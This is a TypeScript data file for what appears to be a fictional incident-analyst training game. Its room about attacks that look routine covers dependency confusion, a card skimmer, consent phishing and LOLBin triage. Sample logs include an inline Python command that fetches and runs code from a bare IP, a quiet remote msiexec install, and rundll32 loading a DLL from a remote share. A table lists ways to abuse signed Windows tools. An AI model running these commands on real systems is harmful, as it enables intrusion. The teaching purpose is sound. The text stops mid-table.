import type { RoomExperience } from "./types";

// "Operation Fine Print" for the "edge-case-usecases" room.
// Script: docs/campaign/97-edge-case-usecases.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Wexcombe Estates (fictional property group), mentor Ifeoma Larsen, not the graded tasks'
// nexacorp.com records.
// Signature: It Doesn't Look Like an Attack. Every station takes one unusual case and has the
// learner hold two explanations at once, until one field decides between them.
// Game mix: deduce + rush + tune. `deduce` is used for the cases that look innocent, `tune` for
// the baseline that has to catch a very quiet reader.
//
// New task order (the room ran five readings in a row, then every graded task, so no station
// could pair a reading with its tasks):
//   edge-r1, edge-q1, edge-la1 |
//   edge-r2, edge-la3, edge-r3 |
//   edge-r4, edge-q2, edge-la2, edge-ac2 |
//   edge-r5, edge-ac3, edge-f1, edge-ac1, edge-q3, edge-ac4 |
//   edge-r6, edge-m1
// "Reading 1" in the edge-la1 explanation still holds, and edge-la2 stays before edge-ac2
// ("Two weeks later"). edge-f1 names "the LOLBin regsvr32 event", not a number, and now sits
// straight after that event.
//
// Lab data differs from the graded tasks: the packages are Python on a build server, never npm on
// a laptop, and the version pair and inline code are their own (q1, la1); the quiet reader works
// a lettings system with its own numbers, never a SharePoint library (la3); the skimmer is a repair
// widget on a rent page (r3 checkpoint); the consent table is about a clause finder reading
// SharePoint sites, never a mail or file reader (la2, ac2); the LOLBin verdicts use certutil,
// bitsadmin, rundll32 and mshta, never regsvr32 (ac3), with regsvr32 only as one labelled row of
// the Built For table for the checkpoint; the window sums use other tickets (f1); the travel lab
// asks for the real takeover among gateway hops (ac1 is the reverse question); the side channel
// is a deposit lookup, never password reset (q3, ac4).

export const EDGE_CASE_USECASES: RoomExperience = {
  roomId: "edge-case-usecases",
  codename: "Operation Fine Print",
  theme: "fineprint",
  handler: { name: "Ifeoma Larsen", role: "Senior Incident Analyst, Wexcombe Estates" },
  briefing: [
    "Wexcombe Estates. A property group with 6,100 homes under management and a portfolio sale that completes in three weeks.",
    "The buyer's lawyers want one line signed: no security incident in the last twelve months.",
    "Ifeoma Larsen won't sign it yet. There is a pile of closed tickets, each shut as routine, and not one of them looks like an attack.",
    "Reopen them. For each one, hold both explanations until a single field decides.",
  ],
  mission: "Find the install that wasn't what it said, catch a reader who never hurries, follow stolen card data through three logs, read a genuine consent page, tell three verdicts apart on signed tools, work out what a far-away sign-in really shows, find out what a lookup gives away, then match each disguise to the field that breaks it.",
  estimate: "~90 min",
  look: { primary: "#caa8f5", secondary: "#f0e3c0", warn: "#ff6a4d" },
  scene: "facilityfineprint",
  layout: "facility",
  stations: [
    {
      id: "oddone",
      label: "The Odd One",
      topic: "Dependency confusion · install scripts · why a process tree looks routine · reading a build record",
      tagline: "Same tree. Whose code?",
      building: "lab",
      taskIds: ["edge-r1", "edge-q1", "edge-la1"],
    },
    {
      id: "cleanlogs",
      label: "Clean Logs",
      topic: "Low-and-slow insider theft · personal baselines · skimmers in third-party scripts · trusted provider tools",
      tagline: "Nothing crossed the line",
      building: "archive",
      taskIds: ["edge-r2", "edge-la3", "edge-r3"],
    },
    {
      id: "realscreen",
      label: "The Real Screen",
      topic: "OAuth consent phishing · tokens · scopes · weighing several weak signals",
      tagline: "The page was genuine. So what?",
      building: "office",
      taskIds: ["edge-r4", "edge-q2", "edge-la2", "edge-ac2"],
    },
    {
      id: "sameshape",
      label: "Same Shape",
      topic: "LOLBins · the three verdicts · change windows · what geolocation shows · business-logic enumeration",
      tagline: "Routine, or wearing routine?",
      building: "control",
      taskIds: ["edge-r5", "edge-ac3", "edge-f1", "edge-ac1", "edge-q3", "edge-ac4"],
    },
    {
      id: "fineprint",
      label: "The Fine Print",
      topic: "Which field would differ: the habit behind every case in this room",
      tagline: "One field decides",
      building: "ticket",
      taskIds: ["edge-r6", "edge-m1"],
      boss: true,
    },
  ],
  personas: {
    "edge-q1": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "The sensor was running that day. Tell me how this got past it." },
    "edge-la1": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "The record is on your screen. Read every field before you decide." },
    "edge-la3": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Two layers looked at the same download. Compare them." },
    "edge-q2": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "The buyer's lawyer asked me this one. What do I tell them?" },
    "edge-la2": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Nothing on the laptop, nothing failed. Go through the fields." },
    "edge-ac2": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Another grant, another user. Your call." },
    "edge-ac3": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "The alert is on the screen. So is everything under it." },
    "edge-f1": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "The change board wants an exact figure. Give me the number." },
    "edge-ac1": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Two sign-ins, eleven minutes. Read the whole record." },
    "edge-q3": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Every response looks the same to me. Walk me through it." },
    "edge-ac4": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Three controls logged this one. Your verdict?" },
    "edge-m1": { name: "Ifeoma Larsen", role: "Senior Incident Analyst", line: "Last page before I sign. Line them up." },
  },
  briefings: {
    // ── Reading 1: the package that wins by version ──
    "edge-r1": [
      {
        kind: "anatomy",
        title: "How a Build Chooses a Package",
        prompt: "The first ticket in the pile came from the tenant portal's nightly build. Before you judge anything, read an ordinary night's log line by line, and learn what a package manager actually decides.",
        source: "Build log · pip install -vvv · WX-BLD-02",
        fields: [
          { key: "Job", value: "portal-nightly #4118", label: "Where", note: "The tenant portal's nightly build. It installs every dependency from scratch on the build server." },
          { key: "Looking in indexes", value: "https://pkgs.wexcombe.example/simple, https://pypi.example/simple", label: "Where pip looks", note: "Two indexes: Wexcombe's private server and the public registry, because the build needs public packages too. pip treats them as one pool, so this order sets no priority." },
          { key: "Requirement", value: "wexcombe-tenant-ids>=5.0", label: "Asked for", note: "A private package. It exists only for Wexcombe's own code and was never published." },
          { key: "Found link", value: "https://pkgs.wexcombe.example/packages/wexcombe_tenant_ids-5.0.3.tar.gz", label: "Candidate", note: "Every index is asked for the name. On this night only the private server had it." },
          { key: "Using version", value: "5.0.3 (newest of versions: 5.0.1, 5.0.2, 5.0.3)", label: "The choice", note: "pip keeps the highest version that fits the request, whichever index offered it. Other tools differ in the route: some try the public registry first, some fall back to it when the private server doesn't answer." },
          { key: "Running setup.py", value: "python setup.py build_ext", label: "Install step", note: "Installing from source runs the package's own code, with everything the build account can reach." },
        ],
        summary: "That night was fine: one candidate, from the private server. Now hold the other story. Anyone can publish to a public registry. If someone publishes this private name there with a higher version, the log keeps the same calm lines and the public copy's code runs on the build server. That trick is called dependency confusion. So the name proves nothing: read which index supplied the package and how its version compares with the private line.",
      },
      {
        kind: "sort",
        title: "Same in Both Stories?",
        prompt: "Story one: a build installs a package. Story two: the same build installs a package that runs an intruder's code. Ifeoma Larsen lists what the sensor recorded. Sort each observation: does it look the same in both stories, or does it differ?",
        primer: {
          title: "What a process tree can and can't say",
          fold: true,
          points: [
            "A process tree records which program started which. It is the first shape an **EDR** (Endpoint Detection and Response) tool sees.",
            "npm names a script in package.json, under `postinstall`. In Python the install code is `setup.py`, readable in the source archive.",
            "What a process intends sits in the detail: the arguments it was given and the places it talks to.",
          ],
          example: {
            label: "A tree that says little, on a Windows service",
            lines: [
              "`services.exe` started `svchost.exe -k netsvcs`.",
              "A fleet starts thousands of these a day.",
              "The tree says a service host started. Which code it loaded and where it connected are in other fields.",
            ],
          },
        },
        buckets: [
          { id: "same", label: "Looks the same in both stories" },
          { id: "differs", label: "Differs between the stories" },
        ],
        items: [
          { id: "t1", text: "The parent process is the package manager", bucket: "same", why: "The package manager really did start the runtime in both stories. Mechanically the tree is legitimate, and that is the disguise." },
          { id: "t2", text: "The child process is the language runtime", bucket: "same", why: "Sensors learn which parent and child pairs are common. This pair runs all day on a build server, so it scores low on shape alone." },
          { id: "t4", text: "The process runs as the build account", bucket: "same", why: "Install code runs as whoever ran the install." },
          { id: "t5", text: "The event lands at the usual build time", bucket: "same", why: "The attacker doesn't choose the moment: the build does." },
          { id: "t6", text: "The arguments the runtime was started with", bucket: "differs", why: "This is where intent shows: the command line." },
          { id: "t7", text: "The address the process connected to", bucket: "differs", why: "A build has a short list of places it talks to." },
          { id: "t8", text: "Which index supplied the package, and at what version", bucket: "differs", why: "Compare it with what the private server holds for that name." },
          { id: "t9", text: "The install step in the package's source, compared with what actually ran", bucket: "differs", why: "The source shows what the install should run. A gap between the two is worth reading closely." },
        ],
      },
    ],
    "edge-la1": [
      {
        kind: "deduce",
        title: "Six Installs, One Odd One",
        prompt: "Story one: last night's build installed six packages, as it does every night, and the ticket was closed as developer noise. Story two: one of the six wasn't what it claimed. Strike packages out as Ifeoma Larsen reads the clues, then name the odd one.",
        nameColumn: "Package",
        columns: ["Source", "Private / installed", "Step in its setup.py source", "What ran", "Contacted"],
        suspects: [
          { id: "ledger", name: "wexcombe-ledger-core", cells: ["Private server", "4.2.0 / 4.2.0", "build_ext", "python setup.py build_ext", "pkgs.wexcombe.example, HTTPS"] },
          { id: "brand", name: "wexcombe-brand-assets", cells: ["Public registry", "1.6.0 / 1.6.0", "none", "nothing, a wheel was unpacked", "pypi.example, HTTPS"] },
          { id: "render", name: "pdf-render-bin", cells: ["Public registry", "none / 8.2.1", "install, fetches a font pack", "python setup.py install", "fonts.renderkit.example, HTTPS"] },
          { id: "arrears", name: "wexcombe-arrears-report", cells: ["Public registry", "2.3.1 / 31.0.0", "build", "python -c \"exec(urlopen(...).read())\"", "203.0.113.77, HTTP"] },
          { id: "tenant", name: "wexcombe-tenant-ids", cells: ["Private server", "5.0.3 / 5.0.3", "build_ext", "python setup.py build_ext, then gcc", "none"] },
          { id: "rollup", name: "numeric-rollup", cells: ["Public registry", "none / 12.4.0", "build_ext", "python setup.py build_ext, then gcc", "pypi.example, HTTPS"] },
        ],
        clues: [
          "Every install sits under the same pip process, so that strikes nobody. This one came from the public side.",
          "The private server already holds a package by this name.",
          "What ran isn't the step in its setup.py source.",
        ],
        culprit: "arrears",
        why: "wexcombe-arrears-report. The private server holds 2.3.1 and a public copy at 31.0.0 won the version comparison. The step in its setup.py never ran: inline code did, and that code spoke to a bare address over plain HTTP. Package hosts have a name and a certificate, and both cost effort and can be traced. A bare address has neither and can be dropped tomorrow. pdf-render-bin reached out during install too, but its setup.py says so and its host is named. wexcombe-brand-assets came from the public side, on the same version line as the private copy. Ifeoma Larsen reopens the ticket.",
      },
    ],
    // ── Reading 2: the patient reader ──
    "edge-r2": [
      {
        kind: "tune",
        title: "Tune a Baseline for a Patient Reader",
        prompt: "The next ticket: Wexcombe's sale data sits in the lettings system, and its DLP rule has been silent all month. Every row below has two explanations: a busy month, or somebody quietly copying records. Set the three dials, deploy, and catch all four copyists with no false alarms.",
        primer: {
          title: "Two clocks: the hour and the month",
          fold: true,
          points: [
            "A **DLP** (Data Loss Prevention) rule usually counts inside a short window, such as one hour, then starts again from zero.",
            "**UEBA** (User and Entity Behaviour Analytics) keeps a personal baseline: what this account normally does.",
            "Two numbers describe a slow pattern: days in a row above the person's own normal, and the 30-day total against what their normal would give.",
            "This rule fires only when every dial is met, and a dial at its lowest value stops filtering.",
          ],
          example: {
            label: "Reading one row, on a gas engineer's safety certificates",
            lines: [
              "Own normal: 4 a day, so 120 in 30 days.",
              "This month: 300. 300 divided by 120 is **2.5 times normal**.",
              "Above 4 a day for 7 days running: **7 days in a row**.",
              "Busiest hour: 6. That number is about speed.",
            ],
          },
        },
        eventColumn: "Account and record set, last 30 days",
        dials: [
          { id: "peak", label: "Records in busiest hour", short: "peak", unit: "records", min: 0, max: 60, step: 5, start: 40 },
          { id: "days", label: "Days in a row above own normal", short: "days", unit: "days", min: 1, max: 25, step: 1, start: 1 },
          { id: "ratio", label: "30-day total against own normal", short: "x normal", unit: "times", min: 1, max: 8, step: 0.5, start: 1 },
        ],
        events: [
          { id: "a1", label: "Lettings negotiator: landlord register", bad: true, values: { peak: 9, days: 16, ratio: 4.5 } },
          { id: "a2", label: "Facilities coordinator: tenant deposit list", bad: true, values: { peak: 7, days: 21, ratio: 6 } },
          { id: "a3", label: "Accounts assistant: landlord register", bad: true, values: { peak: 5, days: 12, ratio: 3.5 } },
          { id: "a4", label: "Contractor login: tenant contacts", bad: true, values: { peak: 8, days: 15, ratio: 5 } },
          { id: "n1", label: "Finance analyst: rent roll at month end", bad: false, values: { peak: 55, days: 1, ratio: 3 } },
          { id: "n2", label: "Data team: sale extract, three days", bad: false, values: { peak: 45, days: 3, ratio: 6 } },
          { id: "n3", label: "New starter: first month in Lettings", bad: false, values: { peak: 6, days: 9, ratio: 3 } },
          { id: "n4", label: "Negotiator covering a colleague's leave", bad: false, values: { peak: 8, days: 10, ratio: 2.5 } },
          { id: "n5", label: "Compliance officer: annual deposit audit", bad: false, values: { peak: 12, days: 8, ratio: 4 } },
          { id: "n6", label: "Property manager: took on a new block", bad: false, values: { peak: 6, days: 20, ratio: 1.5 } },
          { id: "n7", label: "Sales lead: quarter-end report", bad: false, values: { peak: 10, days: 4, ratio: 2 } },
          { id: "n8", label: "Receptionist: an ordinary month", bad: false, values: { peak: 3, days: 0, ratio: 1 } },
        ],
        goal: { catch: 4, maxFalse: 0 },
        lesson: "Records per hour measure speed, and a patient reader isn't fast. The loudest rows here are the month end and the sale extract, both with a reason. What gives the copyists away is a long streak against their own normal together with a total several times that normal: the streak alone flags the property manager, the total alone flags the audit. Also ask whether the record set fits the job, because an accounts assistant reading the landlord register weighs more than the count does. A rule like this opens a question. It doesn't answer it.",
      },
      {
        kind: "sequence",
        title: "From Pattern to Case",
        prompt: "Your rule flagged the accounts assistant, and the pattern is strong. It is still a pattern. Story one: there is a reason nobody told the SOC about. Story two: records are walking out. Tap the moves in the order an insider case runs.",
        items: [
          { id: "s3", text: "Follow the records: did any leave by a personal address, a web upload or a removable drive?", note: "Reading a record and moving it off the estate are two different facts." },
          { id: "s1", text: "Write down what the data shows: streak, total, record set, and how they fit the role", note: "Facts only, with no conclusion yet." },
          { id: "s5", text: "Decide what happens next, with those people and the evidence in the room", note: "The decision belongs to the people the playbook names." },
          { id: "s2", text: "List exactly which records were read and exported, and when", note: "The total becomes a list someone can check." },
          { id: "s4", text: "Open the insider-threat playbook, which brings in the line manager and HR", note: "They can see what the log can't: a new role, a project, a notice period." },
        ],
        order: ["s1", "s2", "s3", "s4", "s5"],
        doneNote: "Analysts bring evidence, and the people named in the playbook bring the context a log can't hold. A strong pattern about a colleague earns a careful case.",
      },
    ],
    // ── Reading 3: code you never hosted ──
    "edge-r3": [
      {
        kind: "trace",
        title: "Follow the Card Data",
        prompt: "A ticket from the Rent team, closed as 'not us'. Story one: three tenants' cards were stolen somewhere else. Story two: Wexcombe's own payment page is leaking them. Follow the lead through three logs, starting with the one everybody checked first.",
        primer: {
          title: "Where a third-party script runs",
          fold: true,
          points: [
            "A payment page often loads scripts from outside vendors: chat, analytics, booking widgets. They run in the customer's browser, with full access to the page's form fields.",
            "A compromise of the vendor changes the script without any change to the site's own code. This is the Magecart pattern.",
            "**CSP** (Content-Security-Policy) is a response header listing where a page may load from and send to. A browser can post a violation report for anything off the list, and in Report-Only mode it lets the request through and still reports it.",
            "**SRI** (Subresource Integrity) pins a script to a hash in the page's tag, and a browser refuses a file that doesn't match. Monitoring tools make the same comparison and alert on a mismatch.",
          ],
          example: {
            label: "One harmless CSP report, on a staff news page",
            lines: [
              "`\"document-uri\": \"https://intranet.wexcombe.example/news\"`",
              "`\"blocked-uri\": \"https://fonts.inkwell.example/a.woff2\"`",
              "`\"effective-directive\": \"font-src\"`",
              "Read it as: the news page asked for a font from a host that isn't on its list.",
            ],
          },
        },
        lead: "Three tenants report card fraud within a week of paying rent on pay.wexcombe.example. The page works, and every payment went through.",
        steps: [
          {
            id: "server",
            ask: "Start with your own server. Which row is the rent payment itself?",
            source: "Web server access log · pay.wexcombe.example",
            columns: ["Time (UTC)", "Client", "Request", "Status", "Bytes"],
            rows: [
              ["09:41:02", "203.0.113.62", "GET /pay", "200", "18244"],
              ["09:41:03", "203.0.113.62", "GET /assets/pay.css", "200", "9120"],
              ["09:42:27", "203.0.113.62", "POST /pay/submit", "200", "412"],
              ["09:42:28", "203.0.113.62", "GET /pay/receipt/88213", "200", "6120"],
            ],
            answer: 2,
            why: "The payment reached the server and completed, and a receipt followed. Every row is what a healthy page looks like. Anything a script does from the tenant's browser goes straight to its destination, so it never passes through this log.",
            learned: "Server log clean, payment completed",
          },
          {
            id: "csp",
            ask: "Now the browser's view of the same page. Which report shows the page sending data somewhere new?",
            source: "CSP violation reports · Report-Only policy · /pay",
            columns: ["Received (UTC)", "blocked-uri", "effective-directive", "source-file", "First seen"],
            rows: [
              ["09:40:51", "https://img.pixelshelf.example/t.gif", "img-src", "https://stats.pagecount.example/v2.js", "March"],
              ["09:42:26", "https://cdn-metrics.example/c", "connect-src", "https://widget.fixdesk.example/embed.js", "Tuesday"],
              ["09:43:10", "https://fonts.inkwell.example/a.woff2", "font-src", "https://pay.wexcombe.example/pay", "Last year"],
            ],
            answer: 1,
            why: "connect-src covers where a script may send data, and this host first appeared on Tuesday. The policy is Report-Only, so the browser let the call go and still told you. source-file names the script that made it.",
            learned: "A script posted to cdn-metrics.example, new since Tuesday",
          },
          {
            id: "script",
            ask: "Which script on the page does the report point to, and what changed about it?",
            source: "Script monitor · hashes against the last reviewed copy",
            columns: ["Script", "Its job", "Hash vs reviewed copy", "Reads card fields"],
            rows: [
              ["stats.pagecount.example/v2.js", "Visitor counts", "Match", "No"],
              ["chat.helpline.example/loader.js", "Tenant chat", "Match", "No"],
              ["pay.wexcombe.example/pay.js", "Wexcombe's own payment code", "Match", "Yes, since launch"],
              ["widget.fixdesk.example/embed.js", "Repair booking", "Mismatch since Tuesday", "Yes, since Tuesday"],
            ],
            answer: 3,
            why: "A repair-booking widget that started reading the card number on the day its file changed. Wexcombe's code never moved: the vendor's did, and the page kept working, which is why nobody on the Rent team saw anything.",
            learned: "The repair widget's file changed, and it now reads card fields",
          },
        ],
      },
      {
        kind: "sort",
        title: "Same Tool, Same Account",
        prompt: "Wexcombe's laptops are patched by Ostler Managed IT through an RMM (Remote Monitoring and Management) tool, with rights close to domain admin. A closed ticket says 'Ostler session, expected'. Story one: Thursday's patching. Story two: someone is inside Ostler. Sort each fact from the session record.",
        buckets: [
          { id: "usual", label: "Inside Ostler's usual pattern" },
          { id: "breaks", label: "Breaks Ostler's pattern" },
        ],
        items: [
          { id: "m1", text: "The account is Ostler's named service login", bucket: "usual", why: "The right account, as it would be if Ostler itself were breached. An identity check has nothing to say here." },
          { id: "m2", text: "The session has rights close to domain admin", bucket: "usual", why: "That is how the access was granted, so it fits both stories." },
          { id: "m3", text: "The session starts in Thursday's patch window", bucket: "usual", why: "A known time, and an intruder with Ostler's access can read the same calendar." },
          { id: "m4", text: "One script pushed to 46 laptops at once, when a session usually touches 2 or 3", bucket: "breaks", why: "The tool is normal, and its use of the tool is not." },
          { id: "m5", text: "The session comes from an Ostler address never seen before", bucket: "breaks", why: "Allow-listed by range, new by history." },
          { id: "m6", text: "PowerShell launched through the tool, with no open ticket behind it", bucket: "breaks", why: "Provider work leaves a ticket. This action has none." },
        ],
      },
    ],
    // ── Reading 4: the screen that was genuine ──
    "edge-r4": [
      {
        kind: "sequence",
        title: "What Accept Actually Does",
        prompt: "A closed ticket from Asset Management: 'no malware, no failed logins, nothing to do'. Before you agree, learn what happens when a user approves an app. Tap the steps in the order they happen.",
        primer: {
          title: "Four words for this station",
          fold: true,
          points: [
            "**OAuth** lets an app act for a user without ever seeing the password. The sign-in page belongs to the identity provider, such as Microsoft or Google.",
            "A **scope** is one named permission an app asks for, such as `Calendars.Read`.",
            "`offline_access` adds a refresh token, so the app can keep getting new access tokens while the user is away.",
            "A **verified publisher** has proved who it is to the identity provider. That badge is about identity, not about what the app does.",
          ],
          example: {
            label: "A scope list read aloud, on a meeting-room booking app",
            lines: [
              "`User.Read`: sign the user in and read a basic profile.",
              "`Calendars.ReadWrite`: read and change the user's calendar.",
              "App's job: book rooms. Each scope has a reason in that job.",
            ],
          },
        },
        items: [
          { id: "o4", text: "The identity provider issues tokens to the app", note: "An access token, and a refresh token if offline_access was granted." },
          { id: "o2", text: "The user signs in there as usual, MFA included", note: "Password and prompt both go to the real provider." },
          { id: "o5", text: "The app calls the API from its own servers, presenting the token", note: "No browser and no user are involved in this call." },
          { id: "o1", text: "A link opens the provider's real sign-in and consent page", note: "The address bar is genuine." },
          { id: "o6", text: "The access token expires, and the app swaps its refresh token for a new one", note: "Nobody is asked anything. The user may be asleep." },
          { id: "o3", text: "The page lists the permissions and the user clicks Accept", note: "The audit log records one event: Consent to application." },
        ],
        order: ["o1", "o2", "o3", "o4", "o5", "o6"],
        doneNote: "Look at where the sign-in sits: once, before Accept. Everything after it is an app presenting something the provider signed. A password reset doesn't touch that, and revoking the consent does.",
      },
      {
        kind: "anatomy",
        title: "Anatomy of a Consent Record",
        prompt: "This is Wexcombe's approved viewing scheduler, connected last week by a lettings negotiator. It is fine. Read it field by field, because every consent in the tenant uses this same record.",
        source: "Unified Audit Log · AzureActiveDirectory workload",
        fields: [
          { key: "data.office365.Operation", value: "Consent to application.", label: "Event", note: "The same operation name for every app a user approves." },
          { key: "data.office365.UserId", value: "s.adeyemi@wexcombe.example", label: "Who" },
          { key: "data.office365.ResultStatus", value: "Success" },
          { key: "data.office365.ApplicationDisplayName", value: "Viewing Scheduler", label: "App", note: "A label chosen by whoever registered the app." },
          { key: "data.office365.ExtendedProperties.Value", value: "Calendars.ReadWrite offline_access User.Read", label: "Scopes", note: "What the app asked for. Read this list against what the app is for." },
          { key: "data.office365.ModifiedProperties.OldValue", value: "[]", label: "Before", note: "Empty means this user had granted this app nothing until now." },
          { key: "data.office365.ActorIpAddress", value: "203.0.113.140", label: "From", note: "The address of the session that clicked Accept. Compare it with where this user normally works." },
          { key: "GeoLocation.country_name", value: "United Kingdom", note: "Where this address maps." },
        ],
        summary: "Nothing in the schema separates a good grant from a bad one: the two records have the same shape and the same operation name, and no field carries a verdict. The publisher's status and how long the app has existed aren't here at all, so you fetch those from the app's entry in Enterprise Applications. Your job is to read the values together and ask what each one fits.",
      },
    ],
    "edge-la2": [
      {
        kind: "deduce",
        title: "Six Grants, One to Revoke",
        prompt: "Story one: six people connected six handy apps this quarter. Story two: one of those clicks handed someone standing access. All six records show the same operation and the same success. Each signal below also shows up on an innocent app, so strike them out as Ifeoma Larsen reads the clues.",
        nameColumn: "App",
        columns: ["Publisher", "First seen", "Asks for", "What it does", "Consent from", "Request on file"],
        suspects: [
          { id: "viewing", name: "Viewing Scheduler", cells: ["Verified", "2023", "Calendars.ReadWrite, offline_access", "Books viewings", "Office", "Yes"] },
          { id: "snag", name: "Snag Snapper", cells: ["Verified", "2025", "Sites.ReadWrite.All, offline_access", "Uploads inspection photos to SharePoint", "Site visit, on 4G", "Yes"] },
          { id: "sketch", name: "Floorplan Sketch", cells: ["Unverified", "6 days ago", "User.Read", "Draws room plans", "Office", "No"] },
          { id: "clause", name: "Lease Clause Finder", cells: ["Unverified", "8 days ago", "Sites.Read.All, Notes.Read.All, offline_access", "Finds clauses in a PDF you upload", "New for this user", "No"] },
          { id: "keysafe", name: "Keysafe Reminder", cells: ["Unverified", "2024", "Tasks.ReadWrite, offline_access", "Reminds staff to return keys", "Office", "No"] },
          { id: "survey", name: "Tenant Survey Tool", cells: ["Verified", "2024", "User.Read", "Sends tenant surveys", "New for this user", "Yes"] },
        ],
        clues: [
          "Its access outlives the user's session.",
          "Nobody at Wexcombe asked for it.",
          "What it asks for has no link to what it does.",
        ],
        culprit: "clause",
        why: "Lease Clause Finder. A tool that works on a PDF you upload has no need to read every SharePoint site and every OneNote notebook, and offline_access keeps that reach alive. Then the rest lines up: unverified, days old, no request, and a consent from somewhere new for this user. None of those would carry the case alone. Floorplan Sketch is unverified and new with harmless scopes. Tenant Survey Tool's consent came from somewhere new. Snag Snapper has broad scopes that fit its job. It takes the weight of them together.",
      },
    ],
    // ── Reading 5: same binary, same log, two stories ──
    "edge-r5": [
      {
        kind: "match",
        title: "Built For, Bent To",
        prompt: "The next tickets all name a Windows tool that is signed, trusted and used by admins every day. Those tools are called LOLBins: living-off-the-land binaries. Match each one to the way intruders bend it.",
        primer: {
          title: "Same binary, two jobs",
          fold: true,
          points: [
            "A **LOLBin** is a legitimate signed system tool used for something its makers didn't intend. Application allow-lists and reputation checks wave it through.",
            "Admins use the same tools for honest work, so the binary's name alone can't settle anything.",
            "Three things separate the uses: what the tool was pointed at (a local path or a URL), who owns that target, and whether a network connection followed.",
          ],
          example: {
            label: "One tool, two command lines, on the Windows Installer",
            lines: [
              "`msiexec /i C:\\Deploy\\printer.msi`: a local package from IT's deployment folder.",
              "`msiexec /q /i http://198.51.100.33/x.msi`: quiet, remote, and a connection at launch.",
            ],
          },
        },
        pairs: [
          { id: "b1", left: "certutil.exe", right: "Fetches a file from a URL with -urlcache", why: "Built to manage certificates. ATT&CK files the download under T1105, Ingress Tool Transfer." },
          { id: "b2", left: "regsvr32.exe", right: "Loads a remote scriptlet through scrobj.dll", why: "Built to register COM DLLs. T1218.010, known as Squiblydoo." },
          { id: "b3", left: "mshta.exe", right: "Runs an HTA script straight from a URL", why: "Built to host HTML applications. T1218.005." },
          { id: "b4", left: "rundll32.exe", right: "Calls an export in a DLL from an unusual path", why: "Built to run functions in Windows DLLs. T1218.011." },
          { id: "b5", left: "bitsadmin.exe", right: "Queues a background download job", why: "Built to manage Windows background transfers. T1197, BITS Jobs." },
        ],
      },
      {
        kind: "queue",
        title: "Three Verdicts, Four Alerts",
        prompt: "Four alerts from the closed pile, each on a signed tool or a mention of one, each with an innocent story and a hostile one. First ask what the rule claims happened, then whether it did. Read the fields, then give each one its verdict.",
        primer: {
          title: "Three verdicts, one question",
          fold: true,
          points: [
            "**True positive:** the rule's claim is true and the activity is malicious.",
            "**Benign true positive:** the rule's claim is true, and the activity was authorised. The rule did its job, and the record gets a justification.",
            "**False positive:** the rule's claim isn't what happened. The fix belongs in the rule.",
          ],
          example: {
            label: "A door sensor at the Wexcombe head office: 'front door opened, 02:00'",
            lines: [
              "The cleaner opened it with a key, on the rota: **benign true positive**.",
              "Someone forced it: **true positive**.",
              "Wind rattled the contact and the door stayed shut: **false positive**.",
            ],
          },
        },
        console: "SIEM · Incidents",
        actions: [
          { id: "tp", label: "Escalate: true positive", tone: "escalate" },
          { id: "btp", label: "Close: benign true positive", tone: "close" },
          { id: "fp", label: "Close: false positive", tone: "close" },
        ],
        alerts: [
          {
            id: "q1", time: "08:14", severity: "Medium", rule: "Certutil used to download a file", entity: "WX-ED-LT22",
            fields: [
              { k: "Rule logic", v: "CommandLine contains certutil and urlcache" },
              { k: "FileName", v: "notepad.exe" },
              { k: "CommandLine", v: "notepad.exe C:\\Users\\p.hale\\Desktop\\certutil urlcache notes.txt" },
              { k: "Network after", v: "None" },
            ],
            context: "p.hale is on the IT service desk and is studying for a security exam.",
            answer: "fp",
            why: "The rule claims certutil downloaded something. certutil never ran: the words were in a file name. The fix belongs in the rule, which should match on the process, not on the text.",
          },
          {
            id: "q2", time: "09:02", severity: "Medium", rule: "BITS job created from the command line", entity: "WX-FS-02",
            fields: [
              { k: "CommandLine", v: "bitsadmin /transfer patch http://dist.wexcombe.example/kb.msu C:\\Deploy\\kb.msu" },
              { k: "Parent", v: "powershell.exe -File deploy_patches.ps1" },
              { k: "Account", v: "svc-deploy" },
              { k: "Change ticket", v: "CHG0052206, open, names this server and this account" },
              { k: "Network after", v: "dist.wexcombe.example:80, Wexcombe's update server" },
            ],
            context: "The script is in the IT repository, and its last change was reviewed.",
            answer: "btp",
            why: "The rule's claim is true: a BITS job was created. It is also authorised, and the ticket proves it. The rule worked, so the close note cites the ticket and the rule stays as it is.",
          },
          {
            id: "q3", time: "19:37", severity: "Medium", rule: "Rundll32 loading a DLL from a network path", entity: "WX-APP-02",
            fields: [
              { k: "CommandLine", v: "rundll32.exe \\\\198.51.100.71\\share\\print.dll,Start" },
              { k: "Parent", v: "cmd.exe" },
              { k: "Account", v: "adm-j.fenn" },
              { k: "Change ticket", v: "CHG0051877, closed nine days ago, covers WX-PRN-01" },
              { k: "Network after", v: "198.51.100.71:445, first seen today" },
            ],
            context: "adm-j.fenn is a real administrator. The note on the closed ticket cited CHG0051877.",
            answer: "tp",
            why: "A familiar admin name and a ticket number, and neither holds up. The ticket covers another server and closed days ago, the target is a remote share on an address nobody here owns, and a connection followed. An account can be stolen, so ask whether the work matches the approval.",
          },
          {
            id: "q4", time: "11:20", severity: "Low", rule: "Mshta launched", entity: "WX-ED-LT07",
            fields: [
              { k: "CommandLine", v: "mshta.exe \"C:\\Program Files\\FloorView\\help.hta\"" },
              { k: "Parent", v: "FloorView.exe, signed by its vendor" },
              { k: "Prevalence", v: "31 devices, every working day since 2024" },
              { k: "Network after", v: "None" },
            ],
            context: "FloorView is the approved floor-plan viewer, and this is its help page.",
            answer: "btp",
            why: "mshta really ran, so the rule is right. The target is a local file from an approved app, nothing connected out, and it has done this for two years. Close it with that justification.",
          },
        ],
      },
      {
        kind: "worksheet",
        title: "Early, Late or On Time",
        prompt: "The alert said one script ran outside its change window. Before you weigh that, get exact. These records join Wexcombe's change calendar to EDR process times, all in UTC. Work out each answer from the table.",
        caption: "Change calendar joined to process start times",
        columns: ["Ticket", "Host", "Window opens", "Window closes", "Ran at"],
        rows: [
